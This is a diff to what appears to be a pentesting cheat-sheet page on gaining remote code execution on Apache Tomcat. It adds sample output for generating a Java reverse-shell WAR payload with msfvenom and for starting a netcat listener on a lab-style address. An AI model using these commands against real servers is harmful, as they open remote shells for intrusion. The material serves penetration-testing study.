@@ -24,10 +24,22 @@ tags: ["Web Exploitation", "Tomcat", "Apache", "Web Server", "War", "Java", "RCE
 msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war
 ```
 
+```console {class="sample-code"}
+$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war
+Payload size: 13029 bytes
+Final size of war file: 13029 bytes
+Saved as: revshell.war
+```
+
 #### 2. Start a listener
 
 ```console
 rlwrap nc -lvnp <LOCAL_PORT>
+```
+
+```console {class="sample-code"}
+$ rlwrap nc -lvnp 1337 
+listening on [any] 1337 ..
 ```
 
 {{< tab set1 tab1 active >}}3a. Manager GUI{{< /tab >}}
